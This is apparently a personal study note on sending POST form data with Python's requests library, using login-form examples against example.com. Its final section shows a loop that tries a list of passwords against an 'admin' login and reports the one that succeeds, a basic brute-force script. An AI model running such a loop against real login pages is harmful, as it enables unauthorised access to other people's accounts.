---
tags: [ "python", "requests", "http-post", "brute-force", "web-security" ]
aliases: [ "POST Requests", "Form Submission" ]
created: 2025-12-21
---

# 📤 Sending POST Data (Form Submission)

> [!info] GET vs POST
> * **GET:** Data is sent in the URL (Visible).
> * **POST:** Data is sent in the body of the request (Hidden from URL, used for logins/uploads).

## 1. Implementation
This script sends a username and password to a web server as if a user filled out a login form.

- 1. Define the data payload
- Format: "input_name1=value1&input_name2=value2"
- 2. Send the POST request
- Note: Use the 'data' parameter for strings or dictionaries
- 3. View the response from the server (e.g., "Login Successful" or "Access Denied")

```python title:post_request.py
import requests

url = "[https://example.com/login](https://example.com/login)"

payload = "username=admin&password=joker101"

response = requests.post(url, data=payload)

print(response.text)
```

## 📝 Pro-Tip: Using Dictionaries

While string payloads work, the `requests` library prefers **Dictionaries**. It automatically handles URL encoding for you:

```python
payload = {
    "username": "admin",
    "password": "joker101"
}
response = requests.post(url, data=payload)
```

## 🛠️ Cyber Use Case: Brute-Forcing

You can wrap this in a `for` loop to test thousands of passwords:

```python
passwords = ["123456", "password", "joker101"]

for pwd in passwords:
    payload = {"username": "admin", "password": pwd}
    res = requests.post(url, data=payload)
    if "Welcome" in res.text:
        print(f"[+] Found Password: {pwd}")
        break
```
